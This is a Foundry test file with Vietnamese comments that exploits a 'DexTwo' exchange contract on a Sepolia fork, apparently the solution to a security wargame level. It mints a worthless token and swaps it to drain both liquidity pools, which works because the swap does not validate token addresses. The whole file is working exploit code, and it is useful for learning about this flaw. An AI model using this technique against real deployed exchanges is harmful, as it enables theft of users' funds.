// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

// TRIỂN KHAI MỘT TOKEN RÁC ĐỂ PHỤC VỤ TẤN CÔNG
contract FakeToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("Fake Token", "FKT") {
        _mint(msg.sender, initialSupply);
    }
}

contract DexTwoExploitTest is Test {
    IDexTwo public dexContract;
    address public token1;
    address public token2;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        // Thay địa chỉ Instance DexTwo thực tế trên Sepolia của ông vào đây
        dexContract = IDexTwo(0x1234567890123456789012345678901234567890);
        token1 = dexContract.token1();
        token2 = dexContract.token2();
    }

    function test_DexTwoDrain() public {
        // 1. Khởi tạo Token rác với nguồn cung dồi dào
        FakeToken fakeToken = new FakeToken(1000);

        // Cấp quyền cho sàn DexTwo tiêu token rác của chúng ta
        fakeToken.approve(address(dexContract), type(uint256).max);

        // 2. PHA 1: Rút cạn Token1
        // Gửi thẳng 100 token rác vào sàn để thiết lập mẫu số = 100 trong công thức định giá
        fakeToken.transfer(address(dexContract), 100);
        // Tiến hành hoán đổi 100 token rác lấy sạch 100 token1
        dexContract.swap(address(fakeToken), token1, 100);

        // 3. PHA 2: Rút cạn Token2
        // Hiện tại sàn đang có 200 token rác, ta truyền vào tử số lượng 200 để lấy về 100% token2
        dexContract.swap(address(fakeToken), token2, 200);

        // Khẳng định trạng thái thanh khoản của sàn đã biến mất hoàn toàn
        uint256 postDexToken1 = IERC20(token1).balanceOf(address(dexContract));
        uint256 postDexToken2 = IERC20(token2).balanceOf(address(dexContract));

        assertEq(postDexToken1, 0, "Audit failed: Token1 pool is not empty");
        assertEq(postDexToken2, 0, "Audit failed: Token2 pool is not empty");

        emit log(
            "Audit Verification: DexTwo liquidity totally depleted using unvalidated custom token injection."
        );
    }
}
